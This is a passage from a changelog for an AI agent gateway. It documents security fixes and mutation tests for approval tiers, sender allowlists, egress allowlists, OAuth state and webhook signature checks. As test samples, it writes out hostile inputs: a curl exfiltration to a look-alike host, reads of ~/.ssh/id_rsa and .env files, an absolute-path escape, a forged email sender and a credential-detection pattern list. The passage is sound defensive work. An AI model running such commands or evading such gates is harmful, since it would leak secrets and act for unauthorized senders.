  the FULL suite stayed GREEN 3636/3636/0 — the leak was entirely unpinned.
- Fix (test only): `test/prod-overlay-safeauto.test.mjs` pins (a) the overlay
  list membership tool-by-tool against `TOOL_RISK` (every non-safe tool excluded
  from safeAuto AND present in requireApproval), (b) that a gate built from the
  overlay pends bash/xclaw_bash/shell/file_write/browser_tab and auto-approves
  reads, and (c) that a real `prod` profile wires those lists and leaves
  `autoApproveMaxTier` unset so the legacy path governs end-to-end. Verified both
  directions: reddens under the exec-leak mutation (and any requireApproval
  narrowing) and passes on the restored byte-identical code.
- Suite: 3639/3639, 0 fail (was 3636; +3).

## 3.222.0 (2026-08-26)

- TEST-COVERAGE (sweep #40 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement line is unchanged and its sha256 is identical
  before and after: `93d4f2b0…`). Enforcement family: the filename guard on
  `POST /skills/proposals/decide` (`src/gateway/routes/eval-queue.mjs:208`),
  which confines a proposal `file` to the proposals dir before handing it to
  `installProposal`/`rejectProposal`:
  `if (!file || /[/\\]/.test(file) || file.includes("..")) { 400 }`.
- The blind spot: `installProposal` (`src/skills/propose.mjs:133`) honors
  `path.isAbsolute(proposalFile)` and reads the path VERBATIM, so an absolute
  `file` escapes the proposals dir entirely — an arbitrary-file read + install-
  as-skill primitive. The route's SOLE defense against that is the `/[/\\]/`
  separator arm; the `..` arm does NOT catch a `..`-free absolute path like
  `/etc/evil.md`. The pre-existing traversal test only fed RELATIVE pathy names
  (`a/b.md`, `a\b.md`), which 400 DOWNSTREAM (ENOENT inside installProposal after
  the relative join), never at the guard. So deleting the separator arm left the
  FULL suite GREEN (3635/0) — a refactor weakening line 208 would open the
  absolute-path escape with the suite still green.
- Fix (test only): `test/skills-proposals-decide.test.mjs` now drives a real
  ABSOLUTE path to a file OUTSIDE the proposals dir carrying valid front matter,
  and asserts rejection AT THE GUARD — status 400 with the guard's own error
  (`/proposal filename/`, distinguishing it from a downstream `{ok:false}` catch)
  and no skill written under skillsDir. Verified both directions: reddens under
  the slash-arm-removed mutation (the absolute path passes the guard and installs
  → 200) and passes on the restored byte-identical code.
- Suite: 3636/3636, 0 fail (was 3635; +1).

## 3.221.0 (2026-08-26)

- TEST-COVERAGE (sweep #39 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement line is unchanged and its sha256 is identical
  before and after: `e4ac2933…`). New enforcement family this sweep: the ROUTE
  wiring of the inbound PagerDuty webhook (`src/gateway/routes/alerts.mjs`).
  `POST /webhooks/pagerduty` is deliberately OPEN at the gateway token gate
  (`auth.mjs:94`) — the HMAC signature verifier IS the authenticator. The route
  consumes the verifier at line 73:
  `if (!ver.ok) { json(res, 401, {error:"invalid_signature"}); return true; }`,
  guarding the privileged side-effect `handlePagerDutyWebhook` (webhook-history
  append + alert mirror + `ops` WS broadcast).
- The blind spot: `verifyPagerDutySignature` (the unit verifier) is exhaustively
  covered by `test/pagerduty-webhook-signature.test.mjs`, but no test drove the
  ROUTE — nothing POSTed a forged or missing signature through
  `tryHandleAlertsRoute` to assert the reject-before-side-effect wiring. Mutating
  line 73 to `if (false)` (forged webhooks always processed) left the FULL suite
  GREEN (3632/0). A refactor weakening that call site would let an
  unauthenticated attacker inject fake PagerDuty incidents — firing operator
  alerts and polluting webhook history — with the suite still green. Same
  #37-shape call-site wiring class: the verifier decision is sound; this pins the
  route's consumption of it.
- Fix (test only): `test/pagerduty-webhook-route-wiring.test.mjs` drives the real
  route across three cases with a secret configured — forged signature → 401
  `invalid_signature` AND webhook history unchanged; missing signature → 401
  `missing_signature` AND history unchanged; valid signature → 200 `ok` AND
  history appended (+1). Verified in both directions: reddens under the `if
  (false)` mutation (forged + missing subtests) and under `if (true)` (accept
  subtest), and passes on the restored byte-identical code.
- Suite: 3635/3635, 0 fail (was 3632; +3).

## 3.220.0 (2026-08-26)

- TEST-COVERAGE (sweep #38 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement line is unchanged and its sha256 is identical
  before and after: `c6804469…`). New enforcement family this sweep: the
  OUTBOUND shell-egress allowlist (`src/security/egress.mjs`), which controls
  data exfiltration from shell commands — distinct from the swarm URL allowlist
  (`ToolPolicy.canExecute`, pinned in sweep #27). In `allowlist` mode,
  `checkShellEgress` permits a command only if EVERY host it names is on the
  allowlist, matched at line 110 by `h === a || h.endsWith("." + a)` (exact host
  OR a true dot-boundary subdomain).
- The blind spot: the only allowlist test (`test/egress.test.mjs`) asserted just
  `api.x.ai`→allow and an unrelated `evil.example`→block. It never drove the
  domain BOUNDARY — no look-alike that contains the allowlisted host as a
  substring, no dot-less prefix-glued host, no legitimate subdomain. So a
  refactor that weakened line 110 to `h.includes(a)` (or dropped the dot to
  `h.endsWith(a)`) would let `curl https://api.x.ai.evil.com/steal` exfiltrate
  data past an `api.x.ai`-only allowlist — with the whole suite still green. This
  is the same domain-boundary class as sweeps #33/#36, on a new (egress) axis.
- PROVEN a blind spot: mutating line 110 to `h === a || h.includes(a)` (which
  admits `api.x.ai.evil.com`) left the FULL suite GREEN (3631/0) — no test
  covered the boundary. Restored byte-identical (sha256 unchanged), then the new
  test reddens under EACH of the three boundary-weakening mutations and passes on
  the restored code: `.includes(a)`→red on the suffix-substring case,
  `.endsWith(a)` [no dot]→red on the prefix-glued case, `h === a` [exact only]→
  red on the real-subdomain case. All directions verified.
- Test: `test/egress.test.mjs` adds "allowlist host match is domain-boundary" —
  under `allowHosts:["api.x.ai"]` it asserts `curl https://api.x.ai.evil.com/…`
  is BLOCKED (suffix-substring exfil), `curl https://xapi.x.ai/…` is BLOCKED
  (no-dot prefix-glued), and `curl https://sub.api.x.ai/…` is ALLOWED (real
  subdomain). Full suite 3632/0.

## 3.219.0 (2026-08-26)

- TEST-COVERAGE (sweep #37 — a byte-identical coverage pin, NOT a behavior
  change; the shipping enforcement line is unchanged and its sha256 is identical
  before and after). The `/trust <30m>` window (`src/security/approvals.mjs`)
  raises the auto-approve ceiling to `risky` for a bounded time; `activeTrustWindow()`
  enforces expiry (`if (Date.now() >= trustWindow.expiresAt) { trustWindow = null;
  return null; }`) and `needsApproval` consumes it at line 276
  (`const trust = activeTrustWindow()`) to compute `effectiveMaxTier`.
- The blind spot: the expiry reset was unit-tested only in ISOLATION
  (`activeTrustWindow() === null` after mock-timer tick), and every "reverts"
  test lowered the ceiling via `clearTrustWindow` (explicit `/trust off`) — NO
  test let a window lapse by wall-clock and then re-drove the real `authorize`
  gate. So the WIRING was unverified: a refactor reading the raw `trustWindow`
  closure var instead of the expiry-enforcing accessor would keep an EXPIRED
  window's `risky` ceiling live forever, silently auto-approving risky commands
  long after `/trust` lapsed — an authorize-time fail-open — with the whole
  suite still green.
- PROVEN a blind spot: mutating line 276 to `const trust = trustWindow` (bypass
  the accessor) left the FULL suite GREEN (3630/0) — no test drove authorize
  after a natural expiry. Restored byte-identical (sha256 unchanged), then the
  new catching test reddens exactly under that mutation
  (`not ok … risky must PEND once the window has naturally expired`) and passes
  on the restored code. Both directions verified (cf. the #12–29 coverage pins).
- Test: `test/trust-window.test.mjs` adds "risky auto-approval STOPS at the
  authorize gate after a natural expiry" — sets a 60s window, confirms a risky
  command AUTO-RUNS inside it (positive control, `mode:auto`), advances mocked
  `Date` past `expiresAt` WITHOUT `/trust off`, then asserts the same command
  PENDS at the real `authorize` gate. Drives the accessor→`needsApproval`→
  `effectiveMaxTier` wiring end-to-end, not the accessor alone. Full suite 3631/0.

## 3.218.0 (2026-08-26)

- SECURITY FIX (sweep #36 — a **fail-OPEN** in the email channel's sender
  authorization; a real behavior change, NOT a byte-identical coverage pin). The
  gate DECISION (`isEmailSenderAllowed`) is domain-boundary hardened and unit-
  tested, but the ADDRESS it judges was mis-extracted from the raw RFC 5322
  `From:` header. `handleMail` (`src/channels/email/index.mjs`) took the FIRST
  @-shaped token anywhere in the header
  (`(mail.from.match(/[\w.+-]+@[\w.-]+/) || [mail.from])[0]`), but a header's
  real mailbox lives inside angle brackets — `Display Name <addr@dom>` — and the
  display name that precedes them is arbitrary, attacker-controlled text.
- The leak: `From: alice@corp.com <mallory@evil.com>` (and the quoted
  `"alice@corp.com" <mallory@evil.com>` variant) resolved to the FORGED display
  name `alice@corp.com` and was ADMITTED under `allowFrom: ["corp.com"]` even
  though the real sender is `mallory@evil.com` — the allowlist bypassed by a
  header the attacker fully controls, then handed the spoofed sender straight to
  the model. Symmetrically, when the real bracketed sender WAS allowlisted, the
  same bug judged the wrong (display-name) address and wrongly DENIED it.
- Fail-open PROVEN live: exposing a `handleMail` seam over the unchanged naive
  extraction reddened all three wiring cases (spoof admitted, quoted spoof
  admitted, legitimate bracketed sender denied) — the shipping fix line IS the
  mutation, so there is no byte-identical restore (cf. sweeps #31, #34).
- Fix: a new pure `extractSenderAddress(fromHeader)` (`src/channels/allow-from.mjs`,
  re-exported through `policy.mjs`) — the LAST bracketed `<…@…>` mailbox wins; a
  bare-token scan runs only as a fallback when no bracketed address exists;
  returns trimmed + lowercased, `""` when the header carries no address. Wired at
  `email/index.mjs:221` (`const fromAddr = extractSenderAddress(mail.from)`).
- Tests: `test/email-sender-gate-wiring.test.mjs` drives the real inbound path
  through the seam (hermetic — persistence off, a `max:0` rate limiter halts an
  admitted sender right after the gate, before any model call; admit/deny is read
  from the `[email] skip sender …` log) and pins both directions of the spoof
  plus the wrongly-denied legitimate sender. Seven `extractSenderAddress` unit
  tests in `channel-allow-policy.test.mjs` pin the extraction itself (bracketed
  over spoof, quoted spoof, plain display name, bracketed-token-without-@ ignored,
  bare fallback, inner whitespace, lowercase/trim + empty/null/undefined → `""`).
  Full suite 3630/0.

## 3.217.0 (2026-08-26)

- TEST-COVERAGE (sweep #35 — a byte-identical coverage pin, NOT a behavior
  change). Closes the Discord half of the composite pairing gate
  `!staticOk && !approved` at its live call site (`src/channels/discord/index.mjs`).
  In `dmPolicy: "pairing"` a DM is admitted iff a STATIC allowlist match OR an
  APPROVED pairing; the deny arm files a pairing request and returns before the
  agent runs.
- Both arms were pinned only in ISOLATION — the static allowlist matcher
  (`isSenderIdAllowed` sweep #21 / `gateDiscord` #23) and the pure `isApproved`
  store (#24) — never the handler's COMBINATION. Telegram's twin was closed by
  `pairing-gate-wiring.test.mjs` (sweep #30) through its webhook seam; that file
  recorded Discord as the next candidate because its handler had no webhook-style
  seam. No test drove the Discord handler, so nothing proved `approved` is even
  consulted at that call site.
- Blind spot PROVEN by mutation: dropping the approval arm (`if (!staticOk)`) —
  which turns an approved-but-not-statically-allowed user AWAY and re-files a
  pairing request — left the FULL suite green at 3617/0. Symmetrically, dropping
  the static arm (`if (!approved)`) also shipped clean. The pure-store test (#24)
  cannot catch either.
- Fix: a `handleInbound` seam on the Discord channel (the real WS dispatch calls
  `handleMessage(pkt.d)`; Discord has no webhook seam like Telegram's
  `handleWebhookRequest`) plus `test/discord-pairing-gate-wiring.test.mjs`, which
  drives the live inbound path with a stubbed `fetch` and observes admission via
  the deterministic `/status` reply ("XClaw Discord up …", sent before the agent).
  Three cases pin both admit arms and the deny direction: static-allowlist match
  → ADMITTED (no pairing request); pairing approval (non-matching allowlist) →
  ADMITTED (proves `approved` is consulted — mutation A reddens it); neither →
  DENIED (pairing reply + a pending request recorded).
- Source is unchanged except the additive test seam (no gate logic touched);
  mutation-verified both directions (A → approved-admit RED, B → static-admit
  RED), restored byte-identical (sha256), full suite 3620/0.

## 3.216.0 (2026-08-26)

- SECURITY FIX (sweep #34 — a **fail-OPEN** in the Slack channel's sender
  authorization; a real behavior change, NOT a byte-identical coverage pin).
  Slack was the sole channel of four that ran the agent for ANY inbound sender.
  Every other channel authorizes WHO may command the bot before invoking it —
  Telegram (`policy.gateTelegram`), Discord (`policy.allowedDiscordChannel`),
  email (`isEmailSenderAllowed`, sweep #33) — but `slack/index.mjs` `handleMessage`
  went straight from the bot-skip checks into `processInbound` → the agent. Poll
  mode restricts WHERE (`channelIds`) but not WHO, and socket-mode `app_mention`s
  arrive from ANY channel the bot is in, so an unauthorized user in a monitored
  channel — or anyone who @-mentions the bot in socket mode — drove the agent.
- Worse than a missing gate: an operator who scoped Slack the way every other
  channel is scoped (`dmPolicy: "allowlist"` + `allowFrom: [...]`) got NO
  enforcement — both keys were silently ignored, so a config that reads as "only
  these senders" admitted everyone.
- Honest reachability: Slack is DISABLED on this deployment
  (`channels.slack.enabled = false`), so this is a LATENT fail-open in shipped,
  wired channel code — not a live leak. It bites any user who enables the Slack
  channel and expects `dmPolicy`/`allowFrom` to restrict senders.
- Fix (fail CLOSED, no regression): new pure `gateSlack(msg)` in
  `src/channels/policy.mjs` (SENDER = `msg.user`/`msg.userId`), routed through the
  shared exact-match matcher `isSenderIdAllowed` (never substring; superstring/
  prefix negatives pinned). Wired into `handleMessage` under
  `dmPolicy === "allowlist"` only — the default `"open"` (and the
  unimplemented-for-Slack `"pairing"`, which has no Slack pairing store) pass
  through unchanged, so no existing deployment regresses. `allowFrom` /
  `allowedUserIds` = allowed Slack user IDs; empty allowlist stays open, matching
  Telegram/Discord.
- Proof (fail-open protocol, both directions): `test/slack-sender-gate.test.mjs`
  drives the real inbound path (new `handleInbound` seam = `handleMessage`) with an
  injected mock agent and a stubbed `globalThis.fetch`. Un-wiring the gate turns
  the two DENY tests RED (an unlisted sender AND a senderless message both reach
  the agent, `calls.length === 1`) while the admit/open tests stay green; wiring it
  flips them to `calls.length === 0`. The pure gate is pinned in
  `test/channel-allow-policy.test.mjs` (mutating `gateSlack` to accept-anyone
  reddens exactly the deny-oriented subtests). Full suite 3617/0.

## 3.215.0 (2026-08-26)

- SECURITY FIX (sweep #33 — a **fail-OPEN** in the email channel's sender
  authorization, `src/channels/email/index.mjs`; a real behavior change, NOT a
  byte-identical coverage pin). Every OTHER channel routes its sender gate through
  the shared exact-match matcher (`isSenderIdAllowed`, `src/channels/policy.mjs`);
  email alone rolled its own `conf.allowFrom.some((a) => fromAddr.includes(a))` — a
  SUBSTRING test. A bare-domain allowlist `allowFrom: ["corp.com"]` therefore
  admitted `attacker@corp.com.evil.com` (the allowed domain as a suffix),
  `attacker@evil-corp.com` (no dot boundary), and even `corp.company@x.com` (the
  domain appearing only in the LOCAL part) — any of which then drove the agent over
  email, replying to and acting for an unauthorized sender.
- Honest reachability: email is DISABLED on this deployment
  (`channels.email.enabled = false`), so this is a LATENT fail-open in shipped,
  wired channel code — not a live leak. It bites any user who enables the email
  channel with a domain-style allowFrom, which is the documented and natural way to
  scope it ("only my company's senders").
- Fix (fail CLOSED): new pure `isEmailSenderAllowed(allowFrom, fromAddr)` in
  `src/channels/allow-from.mjs` (re-exported through `policy.mjs`), consumed by
  `handleMail`. Entries may be a full address (exact match) or a bare domain
  (matches that domain OR a subdomain, on the address's DOMAIN part only — never a
  substring); `*` allows all; an empty/absent list stays open (preserves prior
  behavior). This removes the last ad-hoc channel sender gate and consolidates email
  onto the same allow-from module as Telegram and Discord.
- Close: `test/channel-allow-policy.test.mjs` (+10 cases, the sweep-#21 home for the
  shared gate). The three suffix/look-alike/local-part addresses must be denied and
  the legit address + subdomain admitted. Mutation-proven both directions: reverting
  the matcher to the shipped `some(a => addr.includes(a))` reddens exactly those
  bypass cases (fail-OPEN) while the legit cases stay green; the fix flips them
  closed. Distinct from sweeps #21/#23 (Telegram/Discord sender gates, already on
  the shared matcher) and #31 (Telegram group topic allowlist) — this is the email
  sender gate, the one channel gate that never used the shared module.

## 3.214.0 (2026-08-26)

- SECURITY FIX (sweep #32 — a **fail-OPEN** in the credential/secret escalation of
  the risk classifier, `src/security/risk.mjs:399`; a real behavior change, NOT a
  byte-identical coverage pin). The classifier escalates any action that touches
  credential material (`.ssh/`, `credentials`, `.env`, `*.pem`, `id_rsa`, `oauth`,
  `token`) to `irreversible` → `critical`, so it pends. The guard was gated on
  `impact === "write" || impact === "exec"` — it skipped `read`. A read-family tool
  (`file_read` / `read_file` / `xclaw_file_read`) reading the SAME secret was tiered
  `read` → `safe` and, under the live `autoApproveMaxTier` (`low`), auto-approved and
  exfiltrated to the channel with no pending. `cat ~/.ssh/id_rsa` via bash pended
  `critical`; `file_read({path:"~/.ssh/id_rsa"})` returned `safe`.
- Why it is reachable (not merely a table gap): the sandbox (`guardToolPaths`, wired
  at `agent/loop.mjs:1429`, enabled on prod) blocks workspace ESCAPE, NOT credential
  SENSITIVITY within the workspace. An in-workspace `.env` / `credentials.json` /
  `*.pem` is sandbox-allowed, so the classifier tier is the ONLY gate — and it read
  `safe`. The xclaw repo's own untracked proxy-credential files sit at the workspace
  root, directly in range of an in-workspace `file_read`.
- Fix (fail CLOSED): add `|| impact === "read"` to the guard. Strictly more
  restrictive — it can only newly-escalate a read whose path/arg matches the
  credential regex. Egress is deliberately excluded: browser/navigate `target|to|
  source` args legitimately carry `token`/`oauth` substrings and would false-positive;
  read-family path args are genuine file paths, so the false-positive surface is
  small and over-escalation is fail-closed (it pends). Exec/write behavior is
  byte-unchanged.
- Close: `test/security-risk.test.mjs` (+3 golden-table cases). `file_read` of
  `~/.ssh/id_rsa`, an in-workspace `.env`, and `config/credentials.json` must all be
  `critical` with reason "touches credential/secret material"; the pre-existing benign
  `file_read({path:"src/app.mjs"})` → `safe` remains the negative baseline (no
  false-positive on a non-credential read). Mutation-proven both directions: the
  pre-fix production line is itself the mutation — it reddens the credential-read case
  alone (`# fail 1`, 3595 tests) while the rest of the suite stays green; the fix
  flips only those cases green (`# fail 0`, 3595/3595). Distinct from sweep #31
  (Telegram topic allowlist): that was a channel access gate; this is the tool-risk
  classifier, the authorization tier that decides auto-approve vs pend.

## 3.213.0 (2026-08-26)

- SECURITY FIX (sweep #31 — a **fail-OPEN** in the Telegram group topic allowlist,
  `channels/telegram/group-policy.mjs:96-102`; a real behavior change, NOT a
  byte-identical coverage pin). A forum topic can restrict WHO may command the bot
  via `topics.<id>.allowFrom` (a per-user allowlist). The gate skipped its own deny
  whenever the sender was unidentifiable: `if (fromId && allowed.length &&
  !allowed.includes(fromId))`. A post with no `msg.from` — an anonymous group admin,
  or a `sender_chat` / linked-channel auto-forward — has no id, so `fromId` was
  null, the deny was skipped, and the post was ADMITTED to a topic locked to
  specific user ids.
- Why it runs the agent: for a group under the DEFAULT `dmPolicy:"pairing"`,
  `gateGroupMessage` is the ONLY access gate — the pairing / static-allowlist checks
  in `channels/telegram/index.mjs:617-652` are guarded on `peerKind === "dm"` and do
  not apply to groups. `index.mjs:601` requires only content (which an anonymous post
  has), so such a post reaches the gate, clears it, and runs the agent
  (`index.mjs:655+`). Reachability is proven by the new test failing against the
  pre-fix code (it returned `ok:true`).
- Fix (fail CLOSED): `if (allowed.length && (!fromId || !allowed.includes(fromId)))`.
  Strictly more restrictive — it can only newly-DENY, and only for a topic that
  actually restricts senders (non-empty `allowFrom`). Preserved: an empty `allowFrom`
  still does not restrict; a listed sender is still allowed; an unlisted sender is
  still denied. New: a senderless post to a restricted topic is now denied
  (`topic_user_not_allowed`).
- Close: `test/telegram-p2.test.mjs` (+2). A SENDERLESS `topicMsg` (no `from`) to the
  `allowFrom:["1"]` topic 7 must be DENIED; a senderless post to an UNRESTRICTED topic
  (empty `allowFrom`) must still be ALLOWED (over-restriction guard). Mutation-proven
  both directions: the pre-fix production line is itself the mutation — it reddens the
  senderless-deny test alone (`# fail 1`, 3594/1) while the rest of the suite stays
  green; the fix flips only that test (3595/0). This is distinct from sweep #29
  (3.211.0), which pinned the sender-IN / sender-NOT-in / empty-list branches but not
  the senderless path.

## 3.212.0 (2026-08-25)

- TEST (sweep #30 — the **composite pairing GATE wiring**, `!staticOk &&
  !approved` at the live Telegram call site, `channels/telegram/index.mjs:625-652`;
  a coverage blind spot, not a live leak; production byte-identical). In
  `dmPolicy:"pairing"` the live handler admits a DM iff a STATIC allowlist match OR
  an APPROVED pairing: `const allowedStatic = policy.gateTelegram(update).ok; const
  approved = pairing.isApproved("telegram", chatId); if (!allowedStatic &&
  !approved) { …pairing request…; return; }`. Who gets PAST this gate to the agent
  is the channel's DM authorization decision.
- Proof it was a blind spot: the two ARMS were pinned only in isolation — the
  static allowlist (`isSenderIdAllowed` sweep #21 / `gateTelegram` #23) and the
  pure `isApproved` store (#24) — and every one of those files carried the same
  honest limit (`pairing-approved-gate.test.mjs:25`): "this pins the pure store
  decision, not the channel handler's `!staticOk && !approved` combination, which
  stays untested wiring." No test drove the ADMIT direction through the real
  handler. Dropping the approval arm — `if (!allowedStatic)` — so an APPROVED (but
  not statically-allowed) sender is re-pairing-requested instead of admitted, left
  the FULL pre-existing suite green (3590/0): the wiring that consults `approved`
  at the call site could silently break and ship. Only a test that drives the
  handler and observes admission can catch it.
- Close: `test/pairing-gate-wiring.test.mjs` (+3) drives the real `handleUpdate`
  through the same mock-Bot-API webhook seam the webhook-wiring test uses (sweep
  #17). An admitted `/status` DM sends a DETERMINISTIC reply ("XClaw Telegram up …")
  and returns BEFORE the agent runs, so the ADMIT direction is observable with no
  model call. Pins BOTH admit arms AND the deny direction through the live handler:
  a statically-allowlisted DM is ADMITTED (reaches `/status`, 0 pending requests);
  a pairing-APPROVED DM is ADMITTED (proves `approved` is consulted here); neither
  is DENIED (pairing reply + a pending request recorded).
- Mutation-verified both directions against the live gate: dropping the approval
  arm (`if (!allowedStatic)`) reddens the approved-admit test (`# fail 1`); dropping
  the static arm (`if (!approved)`) reddens the static-admit test (`# fail 1`); the
  pristine gate leaves all three green (3593/0). Closes the honest limit carried
  since #21/#23/#24 for the Telegram channel — `pairing-approved-gate.test.mjs`
  note updated to point here.
- No production code changed — `channels/telegram/index.mjs` is byte-identical
  (sha256 `b523645f…`). Discord is the twin (`channels/discord/index.mjs` has the
  same composite gate but no webhook-style seam) and is the recorded next candidate.

## 3.211.0 (2026-08-25)

- TEST (sweep #29 — the **Telegram forum-topic per-user allowlist**, the
  `topicRule.allowFrom` branch of `gateGroupMessage` in
  `channels/telegram/group-policy.mjs:96-102`; a coverage blind spot, not a live
  leak; production byte-identical). `gateGroupMessage` is wired on the live
  inbound path (`channels/telegram/index.mjs:608-614`): for a group/supergroup
  message a non-ok result `return`s and the agent never runs. Inside a specific
  forum topic (thread), if that topic declares `allowFrom: [...]`, only the listed
  senders may command the bot there — a sender-authorization decision.
- Proof it was a blind spot: `test/telegram-p2.test.mjs` reached
  `gateGroupMessage`'s mention, group-allowlist (`group_not_allowlisted`), and
  topic-`requireMention` branches, but **NO** test exercised the topic
  `allowFrom` gate. Making the deny unreachable
  (`if (false && fromId && allowed.length && !allowed.includes(fromId))` — admit
  any sender to any restricted topic) left the FULL suite green (3587/0): a silent
  revert of this per-user topic gate would ship unnoticed.
- Close: `test/telegram-p2.test.mjs` (+3) pins both directions — a sender NOT in
  the topic `allowFrom` is DENIED (`topic_user_not_allowed`); a listed sender is
  ALLOWED; an empty topic `allowFrom` does not restrict (the `allowed.length`
  open convention). Mutation-verified both directions: `if (false && …)`
  (accept anyone) reddens the deny test (`# fail 1`); inverting the include to
  `allowed.includes(fromId)` (deny-everyone / misroute) reddens the deny + allow
  tests (`# fail 2`); the pristine file leaves all three green.
- No production code changed — `group-policy.mjs` is byte-identical
  (sha256 `de786139…`).

## 3.210.0 (2026-08-25)

- TEST (sweep #28 — the **Telegram `sug` suggestion-button sender-authorization
  gate** under the DEFAULT `pairing` policy, `authorizeTelegramCallback` in
  `channels/telegram/callback-auth.mjs`; a coverage blind spot, not a live leak;
  production byte-identical). Tapping a `sug` inline button re-injects its stored
  prompt as a user message and RUNS the agent
  (`channels/telegram/index.mjs` ~L534), so who may activate a suggestion is a
  command-execution authorization decision, not cosmetic. Under `pairing` — the
  default (`dmPolicy = opts.dmPolicy || "pairing"`) — a `sug` tap is allowed only
  by a three-way OR: the chat is paired, OR the individual sender is paired, OR
  the sender is allowlisted; otherwise `CALLBACK_DENY`.
- Proof it was a blind spot: the dedicated `test/telegram-callback-auth.test.mjs`
  covered `apr`/`pair` (owner check) and the `sug`+`allowlist` deny, but had
  **NO** `sug`+`pairing` test. The one existing `sug`+`pairing` case
  (`RATE_LIMITED`) uses the owner as the tapper, so it short-circuits at the
  owner check and never reaches this block. Replacing the whole three-way OR with
  `if (false)` (accept anyone) left the FULL suite green (3583/0): a silent
  revert of this default-policy gate would ship unnoticed.
- Close: `test/telegram-callback-auth.test.mjs` (+4) pins each arm — the unpaired,
  non-allowlisted sender is DENIED; a sender paired by `fromId` is allowed; a
  sender paired only by `chatId` is allowed; an allowlisted-but-unpaired sender
  is allowed. Mutation-verified both directions: `if (false)` (accept anyone)
  reddens the deny test only (`# fail 1`); `if (true)` (deny everyone) reddens
  the three allow tests (`# fail 3`); the pristine file leaves all four green.
- No production code changed — `callback-auth.mjs` is byte-identical
  (sha256 `59ff0f2e…`).

## 3.209.0 (2026-08-25)

- TEST (sweep #27 — the **swarm ToolPolicy egress gate**,
  `ToolPolicy.canExecute` in `swarm/decompose/tool-policy.mjs`; a coverage blind
  spot, not a live leak; production byte-identical). This is the operator egress
  gate for the swarm tool plane: `createXclawToolBridge` instantiates it whenever
  `cfg.swarm.decompose.tools.policy` is set (the bridge is built for the inbound
  `/swarm` plane in `swarm/runtime.mjs`), and `tool-bridge.mjs` runs it BEFORE
  the risk gate on EVERY tool — including `alwaysAllow` ones — so the operator's
  deny beats the research bypass. It decides four things: blocklist
  (`tool_blocked`), allowlist-mode tool names (`not_in_allowlist`),
  network-egress deny (`egress_denied`), and a URL host-allowlist for any tool
  carrying a `url` (`url_not_allowed`).
- Proof it was a blind spot: that host match had a real bypass once — the
  vendored form was `hostname.includes(entry)`, which let
  `allowed.com.attacker.io` satisfy an allowlist of `allowed.com` (fixed
  2026-08-24 to exact-host OR dot-suffix only). `canExecute` had **ZERO**
  behavioural test — no test imported `tool-policy.mjs` and no bridge test set
  `tools.policy` — so mutating the host match back to the vulnerable
  `host.includes(entry)` left the FULL suite green (3575/0): a silent revert of a
  known security fix would ship unnoticed.
- Close: `test/swarm-tool-policy-egress.test.mjs` (+8) pins all four `canExecute`
  decisions, with the substring-bypass rejection asserted BOTH at the pure
  decision AND end-to-end through the bridge's `execute()` — proving the handler
  actually HONORS the deny (blocked, never dispatched), not just that the
  function returns the right object. Mutation-verified both directions: the
  substring-bypass mutation reddens the decision test and the wiring test
  (`# fail 2`); the pristine file leaves all 8 green.
- No production code changed — `tool-policy.mjs` is byte-identical
  (sha256 `f483693a…`).

## 3.208.0 (2026-08-25)

- TEST (sweep #26 — the **OAuth callback `state` authenticator**,
  `createPending` / `takePending` in `connected/oauth-pending.mjs`; a coverage
  blind spot, not a live leak; production byte-identical). `/oauth/callback` and
  `/auth/callback` (GET) are intentionally OPEN to gateway auth: an IdP browser
  redirect cannot carry a Bearer token. `auth.mjs` treats them as not-protected
  and `gateway-served-inventory.test.mjs` registers them as "OAuth AS browser
  redirect; state-authenticated, not token" — i.e. those tests pin the OPENNESS
  (the intended state), not the guard. The SOLE authenticator of who may complete
  a callback (drive the PKCE token exchange in `routes/oauth-callback.mjs` and
  `setAppToken` a connected app) is therefore the `state` token minted by
  `createPending` and consumed by `takePending` — and it had **ZERO** behavioural
  test: no test imported `connected/oauth-pending.mjs`.
- Proof it was a blind spot: mutating `takePending`'s unknown-state return to
  accept — `if (!entry) return { state, forged: true }` — left the FULL suite
  green (3570/0). A callback carrying an unknown/forged `state` would then be
  treated as a legitimate pending login.
- Close: `test/oauth-pending-state.test.mjs` (+5) pins the authenticator's
  decisions against a real temp `configDir` (so consume exercises BOTH the
  in-memory Map and the on-disk `oauth-pending.json`) — accept a genuine state
  once (round-trip); REJECT an unknown/forged state; treat every state as
  SINGLE-USE (a replayed callback URL cannot re-drive the exchange — the crux);
  REJECT an expired state; and bind each state to its own record (state B never
  yields A's entry, consuming B never consumes A). Mutation-verified RED three
  directions: accept-unknown → reddens reject + single-use; drop the mem consume
  → reddens single-use only; drop the expiry check → reddens expired only.
  `oauth-pending.mjs` byte-identical (`e485b031…`) — coverage-hole close, no
  production change. Suite 3570 → **3575/0**.

## 3.207.0 (2026-08-25)

- TEST (sweep #25 — the **inbound PagerDuty webhook HMAC verifier**,
  `verifyPagerDutySignature`; a coverage blind spot, not a live leak; production
  byte-identical). `/webhooks/pagerduty` (POST) is intentionally OPEN to gateway
  auth — a PagerDuty delivery cannot carry a Bearer token (`auth.mjs:94` returns
  not-protected for `/webhooks/*`; `gateway-auth-cost-usage.test.mjs` pins it "must
  stay open for signed deliveries"). The SOLE authenticator of who may POST a
  webhook that runs `handlePagerDutyWebhook` (mirrors events to channels, appends
  history) is therefore `verifyPagerDutySignature` — and it had **ZERO** behavioural
  test: no test imported `pagerduty-webhooks.mjs`. The only two tests naming the path
  assert it is a known served literal / stays auth-open; neither exercises signature
  acceptance or rejection. (`computer-auth-wrong-cred` tests a DIFFERENT verifier, the
  computer plane's `verifyComputerAuth`.)
- Proof it was a blind spot: mutating the bad-signature return to accept —
  `return { ok: true, mode: "hmac", matchedVersion: "v1" }` — left the FULL suite
  green (3562/0). A FORGED webhook would then be accepted and processed: a total
  inbound-webhook-auth bypass on an open route.
- Close: `test/pagerduty-webhook-signature.test.mjs` (+8) pins the verifier's
  decisions — accept a genuine signature; REJECT a forged one (`bad_signature`);
  REJECT a missing header (`missing_signature`); OPEN when no secret + not required;
  FAIL CLOSED when required but unconfigured (`secret_not_configured`); honor the
  rotation list (any configured secret matches, one not in the list is rejected);
  accept a bare-hex header; and — the crux — REJECT a signature that is valid for a
  DIFFERENT body (the HMAC must bind the exact bytes). Mutation-verified RED three
  directions: accept-forged → 3, reject-genuine → 3, body-not-bound → 1 (that one
  isolates the body-binding test). `pagerduty-webhooks.mjs` byte-identical
  (`d9a10d70…`) — coverage-hole close, no production change. Suite 3562 → **3570/0**.

## 3.206.0 (2026-08-25)

- TEST (sweep #24 — the **`approved` arm** of the channel pairing gate,
